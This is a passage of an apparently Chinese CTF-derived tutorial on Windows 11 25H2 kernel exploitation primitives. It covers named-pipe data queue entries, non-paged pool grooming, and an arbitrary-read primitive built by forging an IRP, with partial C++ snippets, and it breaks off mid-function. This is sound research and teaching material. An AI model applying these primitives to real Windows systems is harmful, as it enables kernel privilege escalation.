---
title: 从 0ctf 2025 Babyfilter 学习 Windows 11下的内核利用原语
url: https://forum.butian.net/share/4738
source: 奇安信攻防社区
date: 2026-01-30
fetch_date: 2026-01-31T04:00:24.640279
---

# 从 0ctf 2025 Babyfilter 学习 Windows 11下的内核利用原语

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 从 0ctf 2025 Babyfilter 学习 Windows 11下的内核利用原语

* [漏洞分析](https://forum.butian.net/topic/48)

借助0ctf 2025 babyfilter 这道题，学习最新版的Windows 11 25h2 下的内核利用技巧

借助0ctf 2025 babyfilter 这道题，学习最新版的Windows 11 25h2 下的内核利用技巧
Windows 11 25H2 下 内核利用技巧
========================
在 Windows 11 25H2的场景下，有一些利用技巧发生了变化，其中最重要的就是 \*\*NtQueryInformationSystem\*\* 这类泄露技巧不再能使用。
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-5ac444507fc4476883a1ead21945f1405e21daa2.png)
在过去，很多的EXP利用的时候，往往需要得知内核中\*\*特定对象\*\*的地址，再通过这个地址对指定对象进行修正。再失去这个API之后，有些攻击手段就不能使用了。
在这种场景下，我们需要寻找一种能够\*\*再触发漏洞的场景中，也能所以进行WWW(Write-What-Where)\*\* 的利用手段。在本文，我们学习[这里](https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/tree/master)提到的使用Windows 中 Pipe 对象进行漏洞利用，实现在不使用NtQuery的场景下进行漏洞利用
利用场景
----
Pipe的使用场景如下
\*\*使用条件：\*\*
（1）能够创建命名Pipe对象的权限
（2）存在一个能够UAF/越界写的能力
\*\*利用思路：\*\*
通过越界写/UAF，在Pipe的DQE列表中的一个对象的完整控制权，之后利用其中的IRP对象，实现读写原语构造。
\*\*效果：\*\*
能够伪造IRP地址 -&gt; 任意读
任意读+写入真实IRP对象内容后，控制伪造IRP -&gt; 任意写
利用技巧介绍
------
在了解利用前，我们需要了解Windows的Pipe对象在内存中是怎么样子存放和工作的。
### PIPE
命名管道在创建的时候，一般会有一个服务端和一个客户端。一般创建的时候，都是使用类似
```cpp
ph->Write = CreateNamedPipeW(
L"\\\\.\\pipe\\exploit\_cng",
PIPE\_ACCESS\_OUTBOUND | FILE\_FLAG\_OVERLAPPED,
PIPE\_TYPE\_BYTE | PIPE\_WAIT,
PIPE\_UNLIMITED\_INSTANCES,
quota,
0,
0,
0);
```
这种代码负责创建。此时这一段的Pipe为服务端的写入端。一般使用的时候，对应的还有一个客户端，使用`CreateFile`进行连接:
```cpp
ph->Read = CreateFile(L"\\\\.\\pipe\\exploit\_cng", GENERIC\_READ, 0, NULL, OPEN\_EXISTING, 0, 0);
DWORD written;
```
在我们做利用的时候，通常是需要我们同时打开读写双端的pipe。当我们创建一个Pipe的时候，在内核会创建一个对应的`Context Control Block (CCB)`对象（下文我们直接用CCB或者Block描述这个对象）。这个对象结构体记录了Pipe这种C/S结构下需要保持的一些成员信息：
```cpp
struct DATA\_QUEUE\_ENTRY {
LIST\_ENTRY NextEntry;
\_IRP\* Irp;
\_SECURITY\_CLIENT\_CONTEXT\* SecurityContext;
uint32\_t EntryType;
uint32\_t QuotaInEntry;
uint32\_t DataSize;
uint32\_t x;
char Data[];
}
```
这个结构体是没有导出的，所以不能用windbg进行检查。这个结构体主要是由驱动`npfs`进行实现的。在有些PoC或者头部文件中，这个结构体也被称之为`NP\_DATA\_QUEUE\_ENTRY`。他们本质上是同一个对象。之后我们可能会用`DQE`来简称这个CCB中的对象。
为了能够稳定的申请指定大小的内存，我们需要准确的计算当前需要的池大小，通常满足这样的数学关系:
```cpp
#define TARGET\_CHUNK\_SIZE 0x1000
#define SPRAY\_SIZE (TARGET\_CHUNK\_SIZE - sizeof(DATA\_QUEUE\_ENTRY))
```
不过，实际上我们申请的时候：
```cpp
ph->Write = CreateNamedPipeW(
L"\\\\.\\pipe\\exploit\_cng",
PIPE\_ACCESS\_OUTBOUND | FILE\_FLAG\_OVERLAPPED,
PIPE\_TYPE\_BYTE | PIPE\_WAIT,
PIPE\_UNLIMITED\_INSTANCES,
quota,
0,
0,
0);
```
此处的`quote`通常为`TARGET\_CHUNK\_SIZE`，这里只是用于标记我们的pipe需要存放的最大数据。在这之后，我们需要调用Write操作：
```cpp
BYTE spray\_data[SPRAY\_SIZE];
memset(spray\_data, 'X', sizeof(spray\_data));
if (!WriteFile(ph->Write, spray\_data, sizeof(spray\_data) - 16, &written, nullptr)) {
printf("failed to write pipe: %lu", GetLastError());
CloseHandle(ph->Read);
CloseHandle(ph->Write);
}
```
这个时候，程序才会真正的创建一个`DQE`，用于存放我们这一次需要写入Pipe的数据的基本信息。这里的`SPRAY\_SIZE`就是之前计算过的，用`TARGET\_CHUNK\_SIZE - sizeof(DATA\_QUEUE\_ENTRY)`计算出来的数据大小（再减去16，也就是池头部大小）
### Data Queue Entry
这里我们简单介绍一下DQE中各个比较关键结构的相关属性
#### NextEntry
在内存中，不同的DQE会使用链表结构进行串联:
![DQE1.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-48c2b0d8bf8d9c72cc692ef725fa8788cd881a87.png)
在我们\*\*调用WriteFile\*\*的时候，就创建一个Entries。而如果当一个Entries中的数据被`ReadFile`读完了，就会将这个对象从双向链表中去掉。
#### EntryType
在Pipe中，存在两种类型的实例：缓存对象（Buffered Entries）和非缓存对象(Unbuffered Entries)，这个就是使用`EntryType`进行存储。
##### 缓存对象 Buffered Entries
正如结构体所示：
```cpp
struct DATA\_QUEUE\_ENTRY {
LIST\_ENTRY NextEntry;
\_IRP\* Irp;
\_SECURITY\_CLIENT\_CONTEXT\* SecurityContext;
uint32\_t EntryType;
uint32\_t QuotaInEntry;
uint32\_t DataSize;
uint32\_t x;
char Data[];
}
```
需要存放在Pipe中的数据会被直接存放在Data数据中:
![DQE2.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-590694f2ae11bd1e7535d70f9bf075c51c398833.png)
常见的`CreateNamedPipeW`创建的正是这种DQE，这种时候我们使用`WriteFile`写入的数据就会放在Data中。
##### 非缓存对象 UnBuffered Entries
当我们使用API`NpInternalWrite(这个API不能直接使用)`进行Pipe写入的时候，会导致分配一个非缓存的DQE。此时操作系统会多分配一个IRP交给这个对象：
![DQE3.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-3dc7214cc68b0ea6209443e94da16d0c362c1ea5.png)
此时，这个IRP描述的是【一个暂时未写完的数据】，用于存放此时用户态未能及时传入到内核态的数据。
想要申请这样的对象，可以使用
```cpp
NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
NtFsControlFile(pipes->Write, 0, 0, 0, &isb, 0x119FF8, target\_buffer, target\_size, 0, 0);
```
这样的方式进行内存分配。这种分配方式的好处在于，可以控制一个\*\*完全由用户可控的\*\*内存空间，其中
- target\\_buffer 为希望控制的内存空间内容
- target\\_size 为希望分配的内存大小
##### IRP
正如前面提到的，IRP用于存放一个\*\*用户态未能及时传入内核态的数据\*\*。它的结构如下
```php
0: kd> dt \_IRP
ntdll!\_IRP
+0x000 Type : Int2B
+0x002 Size : Uint2B
+0x004 AllocationProcessorNumber : Uint2B
+0x006 Reserved1 : Uint2B
+0x008 MdlAddress : Ptr64 \_MDL
+0x010 Flags : Uint4B
+0x014 Reserved2 : Uint4B
+0x018 AssociatedIrp : <unnamed-tag>
+0x020 ThreadListEntry : \_LIST\_ENTRY
+0x030 IoStatus : \_IO\_STATUS\_BLOCK
+0x040 RequestorMode : Char
+0x041 PendingReturned : UChar
+0x042 StackCount : Char
+0x043 CurrentLocation : Char
+0x044 Cancel : UChar
+0x045 CancelIrql : UChar
+0x046 ApcEnvironment : Char
+0x047 AllocationFlags : UChar
+0x048 UserIosb : Ptr64 \_IO\_STATUS\_BLOCK
+0x048 IoRingContext : Ptr64 Void
+0x050 UserEvent : Ptr64 \_KEVENT
+0x058 Overlay : <unnamed-tag>
+0x068 CancelRoutine : Ptr64 void
+0x070 UserBuffer : Ptr64 Void
+0x078 Tail : <unnamed-tag>
```
这里需要注意几个关键成员变量：
- AssociatedIrp：这个是IRP用于存放来自用户态的数据的关键变量之一。不同类型的IRP请求中，这个成员变量的含义会有所不同，它本质为一个Union为 ```cpp
union {
struct \_IRP \*MasterIrp;
\_\_volatile LONG IrpCount;
PVOID SystemBuffer;
} AssociatedIrp;
```
在我们这次讨论的上下文中，这里取值为`AssociatedIRP.SystemBuffer`，后文我们也用SystemBuffer指代这个成员变量
- ThreadListEntry：当前的IRP指向的Thread所在的一个链表，它指向发起该 I/O 请求的线程（ETHREAD）。。实际上，每一个IRP会和一个\*\*线程高度绑定\*\*。当一个线程结束的时候，对应的\*\*IRP也会结束\*\*。下文我们详细介绍。
所以如果我们的PIPE中的数据足够小，能够一次性被读完的时候，IRP这个对象是不存在的。只有满足下面两个条件之一，Windows在会在DQE中存入一个IRP
- 当前申请的DQE为非缓存对象（这代表这个Pipe对象不会被当即读完）
- 当前写入的内存超过了一个Pipe能够存放的最大数据（也就是Pipe中还有其他需要被写入的数据）
实际上，当我们利用的时候，这两个特性都会用到
##### QuotaInEntry
用于描述当前定额的内存中还有多少剩余。对于一个非缓存对象，这个值为0，对于缓存对象，这个值最初会和我们说到的`DataSize`一样大， 然后随着对Pipe的读取，逐渐减少为0
##### DataSize
存放了当前Pipe中能够存放的用户数据的最大长度。
利用原语
----
接下来，我们会介绍如何利用上述的PIPE构造平时利用时可能用到的原语。
### 非分页池风水
这些Pipe使用的都是非分页池，这些池在进行风水的时候，一般有两个思路：
- 使用缓存内存。这种时候我们通常使用`CreateNamedPipe+WriteFile`的形式进行DQE的分配，不过这个时候分配的内存大小需要为`target\_size - sizeof(DATA\_QUEUE\_ENTRY)`
- 使用非缓存内存。这个时候我们通常直接使用`NtFsControlFile`进行风水
不过一般来说，大家还是偏爱使用前面那种方式进行风水，因为使用起来相对简单。
### 任意地址读
当我们尝试使用PeekNamedPipe（注意不是ReadFile）去读取一个Pipe对象的时候，程序会尝试获取当前Pipe中的数据（但是并不是真正意义上从Pipe中将数据读取出来），这一步仅仅是\*\*获取了Pipe中的数据\*\*，所以可以理解成是一个\*\*只读\*\*的行为。
在这个过程中，操作系统会根据DQE的属性\*\*EntryType\*\*，决定我们此时要读取的内存地址是来自于IRP，还是紧跟着DQE的缓存区。当我们的内存地址为非缓存对象的时候，操作系统获取数据会来自于IRP中存放的SystemBuffer（也就是AssociatedIRP）的地址
![DQE3.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-3dc7214cc68b0ea6209443e94da16d0c362c1ea5.png)
所以这里有一个简单的做法就是：我们伪造一个假的FakeIRP，并且在这个FakeIRP中指向一个我们想要读取的内存地址`target\_addr`，同时我们利用漏洞，将当前的DQE修改成\*\*EntryType=Unbuffered(1)\*\*，那么此时，当我们调用`PeekNamedPipe`的时候，系统就会尝试从FakeIRP-&gt;SystemBuffer中读取数据，并且还给PeekNamedPipe读出的buffer中，从而造成一个任意地址读:
![DQE4.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2026/01/attach-d56e5d420fc49d11866a4eb5d44f69501c4b85d5.png)
之后，我们就能够尝试进行关键地址的泄露了。而这个FakeIRP，完全可以来自用户态:
```cpp
void ReadMem(HANDLE port, PIPE\_HANDLES\* pipes, uint64\_t addr, size\_t len, unsigned char\* data) {
static char\* buf = (char\*)malloc(TARGET\_CHUNK\_SIZE + 1);
memset(buf, 0, TARGET\_CHUNK\_SIZE + 1);
DWORD read;
DATA\_QUEUE\_ENTRY dqe;
ReadDat...